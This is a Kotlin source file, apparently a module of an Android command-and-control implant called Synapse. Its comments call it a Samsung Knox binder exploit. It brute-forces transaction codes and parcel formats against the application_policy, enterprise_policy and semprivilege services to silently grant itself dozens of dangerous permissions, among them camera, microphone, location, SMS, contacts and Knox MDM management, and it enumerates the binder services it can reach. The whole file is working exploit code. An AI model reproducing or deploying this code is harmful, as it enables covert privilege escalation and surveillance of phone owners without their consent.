package org.synapse.core.modules

import android.content.Context
import android.content.pm.PackageManager
import android.os.Binder
import android.os.Bundle
import android.os.IBinder
import android.os.Parcel
import android.os.Process
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.reflect.Method

/**
 * KnoxPermissionGrant — Samsung Knox application_policy binder exploit for
 * silent permission granting.
 *
 * Based on S25 findings: the "application_policy" binder service accepts ALL
 * 10 tested transaction codes from untrusted UIDs (including shell). This
 * module brute-forces transaction codes 1-100 with multiple Parcel formats
 * to find the permission grant method, and enumerates all accessible binder
 * services.
 */
object KnoxPermissionGrant {

    private const val TAG = "Synapse.KnoxPermGrant"

    // ── Comprehensive permission list ──────────────────────────────────────
    private val ALL_PERMISSIONS = listOf(
        // Dangerous permissions (Android)
        "android.permission.CAMERA",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.RECEIVE_MMS",
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_PHONE_NUMBERS",
        "android.permission.CALL_PHONE",
        "android.permission.ANSWER_PHONE_CALLS",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.BODY_SENSORS",
        "android.permission.ACTIVITY_RECOGNITION",
        "android.permission.READ_CALENDAR",
        "android.permission.WRITE_CALENDAR",
        "android.permission.PROCESS_OUTGOING_CALLS",
        "android.permission.ACCESS_MEDIA_LOCATION",
        "android.permission.BLUETOOTH_CONNECT",
        "android.permission.BLUETOOTH_SCAN",
        "android.permission.BLUETOOTH_ADVERTISE",
        "android.permission.NEARBY_WIFI_DEVICES",
        "android.permission.USE_EXACT_ALARM",
        "android.permission.SCHEDULE_EXACT_ALARM",
        "android.permission.MANAGE_EXTERNAL_STORAGE",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.CHANGE_WIFI_STATE",
        "android.permission.INTERNET",
        "android.permission.ACCESS_NETWORK_STATE",
        "android.permission.CHANGE_NETWORK_STATE",
        "android.permission.NFC",
        "android.permission.VIBRATE",
        "android.permission.WAKE_LOCK",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.FOREGROUND_SERVICE_CAMERA",
        "android.permission.FOREGROUND_SERVICE_MICROPHONE",
        "android.permission.FOREGROUND_SERVICE_LOCATION",
        "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
        "android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK",
        "android.permission.FOREGROUND_SERVICE_PHONE_CALL",
        // Samsung-specific permissions
        "com.samsung.android.providers.context.permission.WRITE_USE_APP_FEATURE_SURVEY",
        "com.samsung.android.knox.permission.KNOX_APP_MGMT",
        "com.samsung.android.knox.permission.KNOX_CUSTOM_SETTING",
        "com.sec.android.app.samsungapps.permission.INSTALL",
        "com.sec.enterprise.permission.MDM_APP_MGMT",
        "com.sec.enterprise.permission.MDM_DEVICE_INVENTORY",
        "com.sec.enterprise.permission.MDM_RESTRICTION",
    )

    // ── Binder service descriptors ─────────────────────────────────────────
    private val APPLICATION_POLICY_DESCRIPTORS = listOf(
        "com.samsung.android.knox.application.IApplicationPolicy",
        "com.samsung.android.knox.IApplicationPolicy",
        "com.samsung.android.knox.app.IApplicationPolicy",
    )

    private val ENTERPRISE_POLICY_DESCRIPTORS = listOf(
        "com.samsung.android.knox.enterprise.IEnterprisePolicy",
        "com.samsung.android.knox.IEnterprisePolicy",
    )

    // ═══════════════════════════════════════════════════════════════════════
    // Main entry: grant all via Knox application_policy
    // ═══════════════════════════════════════════════════════════════════════

    suspend fun grantAll(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val requested: List<String> = cmd.params["permissions"]
            ?.split(",")?.map { it.trim() }?.filter { it.isNotEmpty() }
            ?: ALL_PERMISSIONS

        val pkgName = context.packageName
        val uid = Process.myUid()
        val userId = uid / 100000

        Log.d(TAG, "=== KnoxPermissionGrant starting ===")
        Log.d(TAG, "Package: $pkgName  UID: $uid  UserID: $userId")
        Log.d(TAG, "Target permissions: ${requested.size}")

        val before = checkAll(context, requested)
        val beforeGranted = before.count { it.value }
        Log.d(TAG, "Before: $beforeGranted/${requested.size} granted")

        val results = mutableListOf<String>()
        val remaining = requested.filter { before[it] != true }.toMutableSet()

        // ── Phase 1: application_policy binder ──────────────────────────
        if (remaining.isNotEmpty()) {
            val r = tryApplicationPolicyGrant(remaining, pkgName, uid, userId)
            recordGrants(context, remaining, r)
            results.add("app_policy: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
            Log.d(TAG, "After app_policy: granted=${r.permsGranted.size}, remaining=${remaining.size}")
        }

        // ── Phase 2: enterprise_policy binder ───────────────────────────
        if (remaining.isNotEmpty()) {
            val r = tryEnterprisePolicyGrant(remaining, pkgName, uid, userId)
            recordGrants(context, remaining, r)
            results.add("enterprise_policy: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
            Log.d(TAG, "After enterprise_policy: granted=${r.permsGranted.size}, remaining=${remaining.size}")
        }

        // ── Phase 3: semprivilege binder ────────────────────────────────
        if (remaining.isNotEmpty()) {
            val r = trySemPrivilegeGrant(remaining, pkgName, uid)
            recordGrants(context, remaining, r)
            results.add("semprivilege: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
            Log.d(TAG, "After semprivilege: granted=${r.permsGranted.size}, remaining=${remaining.size}")
        }

        val after = checkAll(context, requested)
        val granted = requested.filter { after[it] == true }
        val failed = requested.filter { after[it] != true }

        Log.d(TAG, "=== Done: ${granted.size} granted, ${failed.size} failed ===")

        SynapseResponse.PermissionGrantResponse(
            target_permissions = requested,
            granted = granted,
            failed = failed,
            details = results.joinToString(" | ")
        )
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Binder service enumeration
    // ═══════════════════════════════════════════════════════════════════════

    data class ServiceInfo(
        val name: String,
        val accessible: Boolean,
        val txResult: String = "",
        val error: String = ""
    )

    data class GrantResult(
        val technique: String,
        val permsGranted: MutableSet<String> = mutableSetOf(),
        var error: String? = null
    )

    suspend fun enumerateServices(cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        Log.d(TAG, "=== Enumerating binder services ===")

        val services = discoverAllServices()
        Log.d(TAG, "Discovered ${services.size} services via 'service list'")

        val results = mutableListOf<ServiceInfo>()
        for ((idx, svc) in services.withIndex()) {
            if (idx % 50 == 0) {
                Log.d(TAG, "Testing service ${idx + 1}/${services.size}: $svc")
            }
            val info = testServiceAccessible(svc)
            results.add(info)
        }

        val accessible = results.filter { it.accessible }
        val accessibleNames = accessible.map { it.name }
        val inaccessible = results.filter { !it.accessible }

        Log.d(TAG, "Accessible: ${accessible.size}/${services.size}")

        // Return as a shell-like response with details
        SynapseResponse.ShellResponse(
            exit_code = 0,
            stdout = buildString {
                appendLine("=== KnoxPermissionGrant: Binder Service Enumeration ===")
                appendLine("Total services: ${services.size}")
                appendLine("Accessible: ${accessible.size}")
                appendLine("Blocked: ${inaccessible.size}")
                appendLine()
                appendLine("=== Accessible Services ===")
                for (svc in accessibleNames.sorted()) {
                    appendLine("  $svc")
                }
                appendLine()
                appendLine("=== Blocked Services ===")
                for (svc in inaccessible.sortedBy { it.name }.take(100)) {
                    appendLine("  ${svc.name} (${svc.error})")
                }
                if (inaccessible.size > 100) {
                    appendLine("  ... and ${inaccessible.size - 100} more")
                }
            },
            stderr = ""
        )
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Service discovery
    // ═══════════════════════════════════════════════════════════════════════

    private fun discoverAllServices(): List<String> {
        val services = mutableListOf<String>()
        try {
            val process = Runtime.getRuntime().exec(arrayOf("service", "list"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                val l = line!!
                // Format: "SERVICE_NAME: [android.os.IBinder]"
                val colonIdx = l.indexOf(':')
                if (colonIdx > 0) {
                    val name = l.substring(0, colonIdx).trim()
                    if (name.isNotEmpty() && !name.startsWith("Found ")) {
                        services.add(name)
                    }
                }
            }
            reader.close()
            process.waitFor()
        } catch (e: Exception) {
            Log.e(TAG, "service list failed: ${e.message}")
        }
        return services
    }

    private fun testServiceAccessible(serviceName: String): ServiceInfo {
        val binder = getBinderService(serviceName)
        if (binder == null) {
            return ServiceInfo(serviceName, false, "", "binder_lookup_failed")
        }

        // Try a simple transact with code 1 (typically the first non-ping method)
        val data = Parcel.obtain()
        val reply = Parcel.obtain()
        return try {
            data.writeInterfaceToken("android.os.IInterface")
            val token = Binder.clearCallingIdentity()
            try {
                val ok = binder.transact(1, data, reply, 0)
                if (ok) {
                    reply.setDataPosition(0)
                    try { reply.readException() } catch (_: Exception) {}
                    ServiceInfo(serviceName, true, "tx1_ok", "")
                } else {
                    ServiceInfo(serviceName, false, "tx1_failed", "transact_returned_false")
                }
            } catch (e: Exception) {
                ServiceInfo(serviceName, false, "tx1_exception", e.message ?: "unknown")
            } finally {
                Binder.restoreCallingIdentity(token)
            }
        } catch (e: Exception) {
            ServiceInfo(serviceName, false, "", e.message ?: "parcel_error")
        } finally {
            data.recycle()
            reply.recycle()
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 1: application_policy grant
    // ═══════════════════════════════════════════════════════════════════════

    private fun tryApplicationPolicyGrant(
        permissions: Set<String>,
        pkgName: String,
        uid: Int,
        userId: Int
    ): GrantResult {
        val result = GrantResult("application_policy")

        val binder = getBinderService("application_policy")
        if (binder == null) {
            result.error = "application_policy service not found"
            return result
        }
        Log.d(TAG, "application_policy binder obtained")

        // Try each descriptor + transaction code + Parcel format combination
        for (desc in APPLICATION_POLICY_DESCRIPTORS) {
            for (txCode in 1..100) {
                for (perm in permissions.toList()) {
                    if (perm in result.permsGranted) continue

                    // Format 1: interfaceToken + packageName(String) + permission(String) + userId(int) + grantState(int=1)
                    if (trySingleGrant(binder, desc, txCode, format1(perm, pkgName, userId))) {
                        result.permsGranted.add(perm)
                        continue
                    }

                    // Format 2: interfaceToken + packageName(String) + permission(String) + grantState(int=1)
                    if (trySingleGrant(binder, desc, txCode, format2(perm, pkgName))) {
                        result.permsGranted.add(perm)
                        continue
                    }

                    // Format 3: interfaceToken + packageName(String) + List<String>(permissions) + int state
                    if (trySingleGrant(binder, desc, txCode, format3(perm, pkgName))) {
                        result.permsGranted.add(perm)
                        continue
                    }

                    // Format 4: interfaceToken + packageName(String) + Bundle
                    if (trySingleGrant(binder, desc, txCode, format4(perm, pkgName))) {
                        result.permsGranted.add(perm)
                        continue
                    }

                    // Format 5: interfaceToken + int userId + packageName(String) + permission(String)
                    if (trySingleGrant(binder, desc, txCode, format5(perm, pkgName, userId))) {
                        result.permsGranted.add(perm)
                        continue
                    }
                }
                // Check if we got all perms for this tx code
                if (result.permsGranted.size == permissions.size) break
            }
            if (result.permsGranted.size == permissions.size) break
        }

        result.error = if (result.permsGranted.isEmpty()) "no_format_worked" else null
        return result
    }

    // ── Parcel format builders ──────────────────────────────────────────

    /**
     * Format 1: interfaceToken + packageName(String) + permission(String) +
     *           userId(int) + grantState(int=1)
     * Matches: setPermissionGrantState(packageName, permission, userId, grantState)
     */
    private fun format1(perm: String, pkgName: String, userId: Int): Parcel.() -> Unit = {
        writeString(pkgName)
        writeString(perm)
        writeInt(userId)
        writeInt(1)  // GRANT_STATE_ALLOWED
    }

    /**
     * Format 2: interfaceToken + packageName(String) + permission(String) + grantState(int)
     * Matches: grantRuntimePermission(packageName, permission) or
     *          setApplicationPermission(packageName, permission, state)
     */
    private fun format2(perm: String, pkgName: String): Parcel.() -> Unit = {
        writeString(pkgName)
        writeString(perm)
        writeInt(1)  // allow
    }

    /**
     * Format 3: interfaceToken + packageName(String) + List<String> permissions + int state
     * Matches: setPermissionsState(packageName, List<permission>, state)
     */
    private fun format3(perm: String, pkgName: String): Parcel.() -> Unit = {
        writeString(pkgName)
        // Write as String[] via writeStringList
        writeStringList(listOf(perm))
        writeInt(1)  // allow
    }

    /**
     * Format 4: interfaceToken + packageName(String) + Bundle
     * Matches: setApplicationPermissions(packageName, Bundle)
     */
    private fun format4(perm: String, pkgName: String): Parcel.() -> Unit = {
        writeString(pkgName)
        val bundle = Bundle().apply {
            putString("permission", perm)
            putString("grantState", "GRANTED")
            putInt("state", 1)
            putStringArray("permissions", arrayOf(perm))
        }
        writeBundle(bundle)
    }

    /**
     * Format 5: interfaceToken + int userId + packageName(String) + permission(String)
     * Matches: setPermission(userId, packageName, permission)
     */
    private fun format5(perm: String, pkgName: String, userId: Int): Parcel.() -> Unit = {
        writeInt(userId)
        writeString(pkgName)
        writeString(perm)
    }

    // ── Low-level grant attempt ──────────────────────────────────────────

    private fun trySingleGrant(
        binder: IBinder,
        descriptor: String,
        txCode: Int,
        payloadBuilder: Parcel.() -> Unit
    ): Boolean {
        val data = Parcel.obtain()
        val reply = Parcel.obtain()
        return try {
            data.writeInterfaceToken(descriptor)
            data.payloadBuilder()

            val token = Binder.clearCallingIdentity()
            try {
                val ok = binder.transact(txCode, data, reply, 0)
                if (ok) {
                    reply.setDataPosition(0)
                    try {
                        reply.readException()
                    } catch (e: Exception) {
                        // SecurityException: caller doesn't have permission
                        // NullPointerException: wrong parameter format
                        // These are expected — the service processed our request
                        if (e.message?.contains("null", ignoreCase = true) == true) {
                            // NullPointer means our Parcel was close — wrong params
                            // but the service IS processing calls
                        }
                        return false
                    }
                    // No exception = call succeeded
                    val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                    // 0 = success, 1 = success, true = success
                    return rc in listOf(0, 1) || rc == -999  // -999 if no int reply
                }
            } catch (e: Exception) {
                // Transact itself threw (SecurityException, etc.)
            } finally {
                Binder.restoreCallingIdentity(token)
            }
            false
        } catch (e: Exception) {
            false
        } finally {
            data.recycle()
            reply.recycle()
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 2: enterprise_policy grant
    // ═══════════════════════════════════════════════════════════════════════

    private fun tryEnterprisePolicyGrant(
        permissions: Set<String>,
        pkgName: String,
        uid: Int,
        userId: Int
    ): GrantResult {
        val result = GrantResult("enterprise_policy")

        val binder = getBinderService("enterprise_policy")
            ?: getBinderService("enterprise_license_policy")
        if (binder == null) {
            result.error = "enterprise_policy not found"
            return result
        }
        Log.d(TAG, "enterprise_policy binder obtained")

        // Using same format patterns as application_policy
        for (desc in ENTERPRISE_POLICY_DESCRIPTORS) {
            for (txCode in 1..50) {
                for (perm in permissions.toList()) {
                    if (perm in result.permsGranted) continue
                    if (trySingleGrant(binder, desc, txCode, format1(perm, pkgName, userId))) {
                        result.permsGranted.add(perm)
                    } else if (trySingleGrant(binder, desc, txCode, format2(perm, pkgName))) {
                        result.permsGranted.add(perm)
                    }
                }
                if (result.permsGranted.size == permissions.size) break
            }
            if (result.permsGranted.size == permissions.size) break
        }

        result.error = if (result.permsGranted.isEmpty()) "no_format_worked" else null
        return result
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Phase 3: semprivilege grant
    // ═══════════════════════════════════════════════════════════════════════

    private fun trySemPrivilegeGrant(
        permissions: Set<String>,
        pkgName: String,
        uid: Int
    ): GrantResult {
        val result = GrantResult("semprivilege")

        val binder = getBinderService("semprivilege")
        if (binder == null) {
            result.error = "semprivilege not found"
            return result
        }
        Log.d(TAG, "semprivilege binder obtained")

        val descriptors = listOf(
            "com.samsung.android.semprivilege.ISemPrivilegeService",
            "com.sec.android.semprivilege.ISemPrivilegeService",
        )

        for (desc in descriptors) {
            for (txCode in 1..30) {
                for (perm in permissions.toList()) {
                    if (perm in result.permsGranted) continue

                    // Format: interfaceToken + packageName + permission + uid
                    if (trySingleGrant(binder, desc, txCode) {
                            writeString(pkgName)
                            writeString(perm)
                            writeInt(uid)
                        }) {
                        result.permsGranted.add(perm)
                    }
                }
                if (result.permsGranted.size == permissions.size) break
            }
            if (result.permsGranted.size == permissions.size) break
        }

        result.error = if (result.permsGranted.isEmpty()) "no_format_worked" else null
        return result
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Helpers
    // ═══════════════════════════════════════════════════════════════════════

    private fun getBinderService(name: String): IBinder? {
        return try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            getService.invoke(null, name) as? IBinder
        } catch (e: Exception) {
            Log.d(TAG, "getBinderService($name): ${e.message}")
            null
        }
    }

    private fun checkAll(context: Context, permissions: Iterable<String>): Map<String, Boolean> {
        return permissions.associateWith { perm ->
            try {
                context.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
            } catch (_: Exception) { false }
        }
    }

    private fun recordGrants(context: Context, remaining: MutableSet<String>, result: GrantResult) {
        val newlyGranted = remaining.filter {
            try { context.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED }
            catch (_: Exception) { false }
        }.toSet()
        result.permsGranted.addAll(newlyGranted)
        remaining.removeAll(newlyGranted)
    }
}
